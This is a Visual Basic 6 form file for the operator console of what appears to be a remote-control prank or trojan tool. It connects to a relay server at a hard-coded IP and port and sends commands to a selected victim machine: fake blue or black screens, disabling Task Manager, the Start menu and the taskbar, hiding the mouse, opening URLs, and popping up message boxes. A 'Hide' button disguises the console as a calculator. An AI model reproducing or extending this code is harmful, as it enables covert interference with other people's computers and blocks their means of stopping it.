VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmControl 
   BackColor       =   &H00404040&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Control"
   ClientHeight    =   4875
   ClientLeft      =   2055
   ClientTop       =   660
   ClientWidth     =   2025
   Icon            =   "frmControl.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4875
   ScaleWidth      =   2025
   StartUpPosition =   3  'Windows Default
   Begin VB.ListBox lstConnections 
      Height          =   4350
      ItemData        =   "frmControl.frx":1002
      Left            =   120
      List            =   "frmControl.frx":1004
      TabIndex        =   10
      Top             =   480
      Width           =   1815
   End
   Begin VB.CommandButton butDisconnectServer 
      Caption         =   "Disconnect Server"
      Height          =   255
      Left            =   120
      TabIndex        =   14
      Top             =   4440
      Width           =   1815
   End
   Begin VB.CommandButton butShutDown 
      BackColor       =   &H00FF8080&
      Caption         =   "Shut Down"
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   13
      Top             =   1920
      Width           =   1815
   End
   Begin MSWinsockLib.Winsock sckConnect 
      Left            =   1800
      Top             =   5160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemoteHost      =   "172.19.9.146"
      RemotePort      =   15674
   End
   Begin VB.CommandButton butCloseUser 
      Caption         =   "Close User Connection"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   12
      Top             =   3720
      Width           =   1815
   End
   Begin VB.CommandButton butHide 
      Caption         =   "Hide"
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   11
      Top             =   4080
      Width           =   1815
   End
   Begin VB.CommandButton butGetConnections 
      Caption         =   "Get Connections"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   1815
   End
   Begin VB.CommandButton butKeyboard 
      BackColor       =   &H00FF8080&
      Caption         =   "Open Internet Explorer"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   9
      Top             =   1560
      Width           =   1815
   End
   Begin VB.CommandButton butBlackScreen 
      BackColor       =   &H008080FF&
      Caption         =   "Display Black Screen"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   8
      Top             =   480
      Width           =   1815
   End
   Begin VB.CommandButton butBlueScreen 
      BackColor       =   &H008080FF&
      Caption         =   "Display Blue Screen"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   7
      Top             =   120
      Width           =   1815
   End
   Begin VB.CommandButton butTaskManager 
      BackColor       =   &H0080FF80&
      Caption         =   "Disable Task Manager"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   6
      Top             =   2640
      Width           =   1815
   End
   Begin VB.CommandButton butTaskbar 
      BackColor       =   &H0080FF80&
      Caption         =   "Disable Taskbar"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   5
      Top             =   3360
      Width           =   1815
   End
   Begin VB.CommandButton butStartMenu 
      BackColor       =   &H0080FF80&
      Caption         =   "Disable Start Menu"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   4
      Top             =   3000
      Width           =   1815
   End
   Begin VB.CommandButton butReply 
      BackColor       =   &H0080FFFF&
      Caption         =   "Send Reply Box"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   3
      Top             =   1200
      Width           =   1815
   End
   Begin VB.CommandButton butTextbox 
      BackColor       =   &H0080FFFF&
      Caption         =   "Send Message Box"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   2
      Top             =   840
      Width           =   1815
   End
   Begin VB.CommandButton butBeep 
      BackColor       =   &H00FF8080&
      Caption         =   "Send Beep"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   1
      Top             =   2280
      Width           =   1815
   End
End
Attribute VB_Name = "frmControl"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim strIP As String

'FROM SERVER
', - Get Connections
'` - Show Reply Message Box

'TO SERVER
'? - Stop connection to specified user

'# - Display Blue Screen
'$ - Hide Blue Screen
'% - Display Black Screen
'^ - Hide Black Screen

'! - Beep
'~ - Message Box
'@ - Reply Box

'& - Disable Task Manager
'* - Enable Task Manager
'( - Hide Mouse
') - Show Mouse
'| - Open Internet Explorer
'_ - Close Internet Explorer
'= - Disable Start Menu
'+ - Enable Start Menu
'[ - Hide Task Bar
'] - Show Task Bar

Private Sub butCloseUser_Click()
    
    butBlueScreen.Caption = "Display Blue Screen"
    butBlueScreen.Enabled = True
    
    butBlackScreen.Caption = "Display Black Screen"
    butBlackScreen.Enabled = True
    
    butTaskManager.Caption = "Disable Task Manager"
    butKeyboard.Caption = "Open Internet Explorer"
    butStartMenu.Caption = "Disable Start Menu"
    butTaskbar.Caption = "Disable Taskbar"
    
    butGetConnections.Visible = True
    butGetConnections.Enabled = True
    lstConnections.Clear
    lstConnections.Visible = True
    
    sckConnect.SendData ("?" & lstConnections.Text)
    'MsgBox (lstConnections.ListIndex)
    'MsgBox (lstConnections.ListCount)
    'MsgBox (lstConnections.Text)
    
    'lstConnections.RemoveItem (lstConnections.ListIndex)

End Sub

Private Sub butDisconnectServer_Click()
    sckConnect.Close
    butGetConnections.Visible = True
    butGetConnections.Enabled = True
    lstConnections.Clear
    lstConnections.Visible = True
End Sub

Private Sub butGetConnections_Click()
    'sckConnect.RemotePort = 15674
    sckConnect.Connect
End Sub

Private Sub butBlueScreen_Click()
    If butBlueScreen.Caption = "Display Blue Screen" Then
    
        butTaskManager.Visible = False
        butTaskbar.Visible = False
    
        butBlueScreen.Caption = "Hide Blue Screen"
        butBlackScreen.Enabled = False
        sckConnect.SendData (strIP & ":" & "#")
    ElseIf butBlueScreen.Caption = "Hide Blue Screen" Then
    
        butTaskManager.Visible = True
        butTaskbar.Visible = True
    
        butBlueScreen.Caption = "Display Blue Screen"
        butBlackScreen.Enabled = True
        sckConnect.SendData (strIP & ":" & "$")
    End If
End Sub

Private Sub butBlackScreen_Click()
    If butBlackScreen.Caption = "Display Black Screen" Then
    
        butTaskManager.Visible = False
        butTaskbar.Visible = False
        
        butBlackScreen.Caption = "Hide Black Screen"
        butBlueScreen.Enabled = False
        sckConnect.SendData (strIP & ":" & "%")
    ElseIf butBlackScreen.Caption = "Hide Black Screen" Then
    
        butTaskManager.Visible = True
        butTaskbar.Visible = True
        
        butBlackScreen.Caption = "Display Black Screen"
        butBlueScreen.Enabled = True
        sckConnect.SendData (strIP & ":" & "^")
    End If
End Sub

Private Sub butBeep_Click()
    sckConnect.SendData (strIP & ":" & "!")
End Sub

Private Sub butTextbox_Click()
    Dim strMessage As String
    
    strMessage = InputBox("Please enter the message you would like to send with your message box", "Message Box Text")

    sckConnect.SendData (strIP & ":" & "~" & strMessage)
End Sub

Private Sub butReply_Click()
    Dim strInstructions As String
    
    strInstructions = InputBox("Please enter the message you would like the client to respond to", "Input Box Message")
    
    sckConnect.SendData (strIP & ":" & "@" & strInstructions)
End Sub

Private Sub butTaskManager_Click()
    If butTaskManager.Caption = "Disable Task Manager" Then
        butTaskManager.Caption = "Enable Task Manager"
        sckConnect.SendData (strIP & ":" & "&")
    ElseIf butTaskManager.Caption = "Enable Task Manager" Then
        butTaskManager.Caption = "Disable Task Manager"
        sckConnect.SendData (strIP & ":" & "*")
    End If
End Sub

Private Sub butKeyboard_Click()
    Dim strAddress As String
    
    'If butKeyboard.Caption = "Open Internet Explorer" Then
    '    butKeyboard.Caption = "Close Internet Explorer"
        strAddress = InputBox("Enter URL to open", "URL")
        sckConnect.SendData (strIP & ":" & "|" & strAddress)
    'ElseIf butKeyboard.Caption = "Open Internet Explorer" Then
    '    butKeyboard.Caption = "Close Internet Explorer"
    '    sckConnect.SendData (strIP & ":" & "_" & strAddress)
    'End If
End Sub

Private Sub butStartMenu_Click()
    If butStartMenu.Caption = "Disable Start Menu" Then
        butStartMenu.Caption = "Enable Start Menu"
        sckConnect.SendData (strIP & ":" & "=")
    ElseIf butStartMenu.Caption = "Enable Start Menu" Then
        butStartMenu.Caption = "Disable Start Menu"
        sckConnect.SendData (strIP & ":" & "+")
    End If
End Sub

Private Sub butTaskbar_Click()
    If butTaskbar.Caption = "Disable Taskbar" Then
        butTaskbar.Caption = "Enable Taskbar"
        sckConnect.SendData (strIP & ":" & "[")
    ElseIf butTaskbar.Caption = "Enable Taskbar" Then
        butTaskbar.Caption = "Disable Taskbar"
        sckConnect.SendData (strIP & ":" & "]")
    End If
End Sub

Private Sub butHide_Click()
    Dim dblNumber As Double

    Randomize Timer
    dblNumber = Int(Rnd * 500000)
    frmCalculator.Text1.Text = dblNumber
    
    frmCalculator.Visible = True
    frmControl.Visible = False
End Sub

Private Sub Form_Unload(Cancel As Integer)
    sckConnect.Close
    Unload frmCalculator
    Unload frmControl
End Sub



Private Sub lstConnections_Click()
    strIP = lstConnections.Text
    lstConnections.Visible = False
    butGetConnections.Visible = False
    
    butBlueScreen.Enabled = True
    butBlackScreen.Enabled = True
    butBeep.Enabled = True
    butCloseUser.Enabled = True
    butKeyboard.Enabled = True
    butReply.Enabled = True
    butTaskbar.Enabled = True
    butTaskManager.Enabled = True
    butStartMenu.Enabled = True
    butTextbox.Enabled = True
End Sub

Private Sub sckConnect_DataArrival(ByVal bytesTotal As Long)
    Dim strData As String
    Dim strHold As String
    Dim intCount As Integer
    
    sckConnect.GetData strData
    
    butGetConnections.Enabled = False
    
    If Left(strData, 1) = "," Then ' Get Users
        strData = Right(strData, Len(strData) - 1)
         
        For intCount = 1 To Len(strData)
        
            If Mid(strData, intCount, 1) <> "," Then
                strHold = strHold + Mid(strData, intCount, 1)
                If Len(strData) = intCount Then
                    lstConnections.AddItem strHold
                    strHold = ""
                End If
            ElseIf Mid(strData, intCount, 1) = "," Then
                lstConnections.AddItem strHold
                strHold = ""
            End If
        Next intCount
        
    ElseIf Left(strData, 1) = "`" Then 'Reply Message Box
        MsgBox (Right(strData, Len(strData) - 1))
    End If
    
End Sub

Private Sub sckConnect_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    MsgBox (Description)
    sckConnect.Close
    Unload frmCalculator
    Unload frmControl
End Sub
